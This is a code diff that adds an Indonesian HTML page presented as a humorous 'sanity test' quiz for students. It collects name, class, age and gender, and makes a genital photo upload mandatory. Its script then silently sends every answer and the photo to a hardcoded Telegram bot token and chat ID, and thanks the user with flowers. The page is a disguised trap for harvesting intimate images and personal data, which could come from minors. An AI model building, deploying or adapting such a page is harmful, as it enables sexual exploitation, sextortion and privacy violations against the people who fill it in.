@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Keterangan Kewarasan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #1fb2ff, #4a00e0);
+      color: white;
+      padding: 20px;
+      animation: bgflow 15s infinite alternate;
+    }
+    @keyframes bgflow {
+      0% { background-position: 0 0; }
+      100% { background-position: 100% 100%; }
+    }
+    h1 {
+      text-align: center;
+      font-size: 2.8em;
+      text-shadow: 0 0 10px cyan;
+    }
+    .form-container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
+    }
+    label {
+      font-weight: bold;
+    }
+    input[type="text"], input[type="number"], select, textarea {
+      width: 100%;
+      padding: 10px;
+      border-radius: 10px;
+      border: none;
+      margin-bottom: 15px;
+      font-size: 1em;
+    }
+    .question {
+      margin-bottom: 30px;
+    }
+    .options {
+      margin-left: 20px;
+      margin-top: 5px;
+    }
+    .options label {
+      display: block;
+      margin-bottom: 8px;
+      cursor: pointer;
+    }
+    input[type="radio"] {
+      margin-right: 10px;
+      transform: scale(1.2);
+    }
+    button {
+      background: #00ffff;
+      color: black;
+      padding: 12px 20px;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1.2em;
+      box-shadow: 0 0 10px #00ffff;
+    }
+    .animate-glow {
+      animation: glow 2s infinite alternate;
+    }
+    @keyframes glow {
+      from { box-shadow: 0 0 10px cyan; }
+      to { box-shadow: 0 0 20px white; }
+    }
+    .watermark {
+      text-align: center;
+      margin-top: 50px;
+      font-size: 0.9em;
+      color: #eee;
+      opacity: 0.6;
+      text-shadow: 0 0 3px #fff;
+    }
+  </style>
+</head>
+<body>
+  <h1>KETERANGAN KEWARASAN</h1>
+  <p style="text-align:center;">Selamat datang! Silakan isi form di bawah ini sesuai kewarasan anda</p>
+
+  <div class="form-container animate-glow">
+    <form id="examForm">
+      <label>Nama</label>
+      <input type="text" name="Nama" required />
+
+      <label>Kelas</label>
+      <input type="text" name="Kelas" required />
+
+      <label>Usia</label>
+      <input type="number" name="Usia" required />
+
+      <label>Gender</label>
+      <select name="Gender" required>
+        <option value="">Pilih...</option>
+        <option value="Laki-laki">Laki-laki</option>
+        <option value="Perempuan">Perempuan</option>
+        <option value="Lainnya">Lainnya</option>
+      </select>
+
+      <label>Foto Kelamin</label>
+      <input type="file" name="file" accept="image/*" required />
+      
+      <hr/>
+      <h3>Soal Pilihan Ganda</h3>
+
+      <div class="question">
+        <label>1. Anda bangun tidur jam 2 pagi, buka HP, lalu...</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 1" value="A" required /> A. Scroll TikTok 3 jam terus tidur lagi</label>
+          <label><input type="radio" name="Soal 1" value="B" /> B. Cek chat dari gebetan</label>
+          <label><input type="radio" name="Soal 1" value="C" /> C. Lihat saldo rekening sambil menangis</label>
+          <label><input type="radio" name="Soal 1" value="D" /> D. Tanya ke diri sendiri, 'Kok masih hidup?'</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>2. Saat ditegur karena ngomong sendiri, Anda bilang:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 2" value="A" required /> A. Saya sedang meeting dengan otak saya</label>
+          <label><input type="radio" name="Soal 2" value="B" /> B. Lah itu bukan saya, itu alter ego</label>
+          <label><input type="radio" name="Soal 2" value="C" /> C. Maaf, kebiasaan debat sama logika sendiri</label>
+          <label><input type="radio" name="Soal 2" value="D" /> D. Emang salah ya ngomong sama tembok?</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>3. Anda lihat seseorang lompat-lompat di zebra cross sambil nyanyi. Anda:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 3" value="A" required /> A. Ikutan nyanyi</label>
+          <label><input type="radio" name="Soal 3" value="B" /> B. Rekam buat konten</label>
+          <label><input type="radio" name="Soal 3" value="C" /> C. Diam-diam kasih nilai 10</label>
+          <label><input type="radio" name="Soal 3" value="D" /> D. Tanya: 'Kamu juga dari planet Mars?'</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>4. Apa tanda seseorang sudah tidak waras secara halus?</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 4" value="A" required /> A. Ketawa sendiri di angkot</label>
+          <label><input type="radio" name="Soal 4" value="B" /> B. Beli mic karaoke wireless</label>
+          <label><input type="radio" name="Soal 4" value="C" /> C. Makan mie instan pakai sedotan</label>
+          <label><input type="radio" name="Soal 4" value="D" /> D. Berdebat sama notifikasi</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>5. Ketika lagi stres, Anda lebih memilih:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 5" value="A" required /> A. Nonton anime terus nangis</label>
+          <label><input type="radio" name="Soal 5" value="B" /> B. Makan apa aja asal bukan masalah</label>
+          <label><input type="radio" name="Soal 5" value="C" /> C. Tulis status nyindir di WA</label>
+          <label><input type="radio" name="Soal 5" value="D" /> D. Cuma rebahan dan menghilang</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>6. Anda ngerasa dunia ini nggak adil, maka Anda akan:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 6" value="A" required /> A. Posting story: 'hidup itu keras'</label>
+          <label><input type="radio" name="Soal 6" value="B" /> B. Jadi motivator dadakan</label>
+          <label><input type="radio" name="Soal 6" value="C" /> C. Balas dendam via status</label>
+          <label><input type="radio" name="Soal 6" value="D" /> D. Mandi air galon biar hemat air mata</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>7. Apa reaksi Anda jika gebetan ngetik 'hmmm...' ?</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 7" value="A" required /> A. Panik dan overthinking</label>
+          <label><input type="radio" name="Soal 7" value="B" /> B. Kirim stiker random</label>
+          <label><input type="radio" name="Soal 7" value="C" /> C. Bales 'kok diem sih?'</label>
+          <label><input type="radio" name="Soal 7" value="D" /> D. Langsung unfriend biar nggak sakit</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>8. Teman Anda tiba-tiba nangis tanpa sebab. Anda bilang:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 8" value="A" required /> A. "Yuk healing"</label>
+          <label><input type="radio" name="Soal 8" value="B" /> B. "Udah makan?" padahal dia nangis</label>
+          <label><input type="radio" name="Soal 8" value="C" /> C. "Pantesan mendung"</label>
+          <label><input type="radio" name="Soal 8" value="D" /> D. "Kalau mau nangis, nangis aja bareng"</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>9. Anda typo di grup WA keluarga. Yang terjadi?</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 9" value="A" required /> A. Langsung leave grup</label>
+          <label><input type="radio" name="Soal 9" value="B" /> B. Bales typo pake typo</label>
+          <label><input type="radio" name="Soal 9" value="C" /> C. Semua diam membisu</label>
+          <label><input type="radio" name="Soal 9" value="D" /> D. Dapat nasihat panjang lebar dari Om</label>
+        </div>
+      </div>
+
+      <div class="question">
+        <label>10. Di tengah krisis hidup, Anda paling relate dengan kalimat:</label>
+        <div class="options">
+          <label><input type="radio" name="Soal 10" value="A" required /> A. Hidup cuma sekali, tapi salah terus</label>
+          <label><input type="radio" name="Soal 10" value="B" /> B. Woles aja, stres belakangan</label>
+          <label><input type="radio" name="Soal 10" value="C" /> C. Gue nggak gila, cuma beda perspektif</label>
+          <label><input type="radio" name="Soal 10" value="D" /> D. Setiap detik adalah perjuangan pura-pura waras</label>
+        </div>
+      </div>
+      
+      <hr/>
+      <h3>Soal Esai</h3>
+
+      <div class="question">
+        <label>1. Jelaskan bagaimana cara Anda mengatasi overthinking ketika tidak ada yang sebenarnya perlu dipikirkan.</label>
+        <textarea name="Esai 1" rows="4" required></textarea>
+      </div>
+
+      <div class="question">
+        <label>2. Pernahkah Anda merasa semua orang membenci Anda padahal kenyataannya... ya, memang mereka tidak peduli? Jelaskan.</label>
+        <textarea name="Esai 2" rows="4" required></textarea>
+      </div>
+
+      <div class="question">
+        <label>3. Menurut Anda, apakah menyimpan screenshot chat lama termasuk ciri-ciri kewarasan atau justru tanda seseorang sedang terjebak masa lalu?</label>
+        <textarea name="Esai 3" rows="4" required></textarea>
+      </div>
+
+      <div class="question">
+        <label>4. Apa hal tergila tapi logis yang pernah Anda lakukan demi terlihat 'baik-baik saja' di mata orang lain?</label>
+        <textarea name="Esai 4" rows="4" required></textarea>
+      </div>
+
+      <div class="question">
+        <label>5. Tuliskan pesan Anda kepada versi diri sendiri yang sedang tidak waras hari ini.</label>
+        <textarea name="Esai 5" rows="4" required></textarea>
+      </div>
+
+      <button type="submit">Kirim Jawaban</button>
+    </form>
+  </div>
+
+  <div class="watermark">© Wanz Official</div>
+
+  <script>
+    const token = "7593438716:AAGn6wr0_5-5uO2LXmKpagZcneoXdmca-zg";
+    const chatId = "7950114253";
+
+    document.getElementById("examForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const form = e.target;
+      const formData = new FormData(form);
+      const entries = [...formData.entries()];
+      const text = entries.filter(e => e[0] !== "file").map(e => `${e[0]}: ${e[1]}`).join("\\n");
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: "*[🧠 HASIL UJIAN KEWARASAN]*\\n\\n" + text,
+            parse_mode: "Markdown"
+          })
+        });
+
+        const file = formData.get("file");
+        if (file) {
+          const fd = new FormData();
+          fd.append("chat_id", chatId);
+          fd.append("photo", file);
+          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: fd
+          });
+        }
+
+        alert("✅ Jawaban berhasil dikirim ke Telegram.\\n\\nKarena Anda sudah mengisi dengan lengkap, ini bunga untuk Anda:\\n🌸🌼🌺🌷🌹🌻");
+        form.reset();
+      } catch (error) {
+        alert("❌ Gagal mengirim jawaban. Silakan coba lagi.");
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
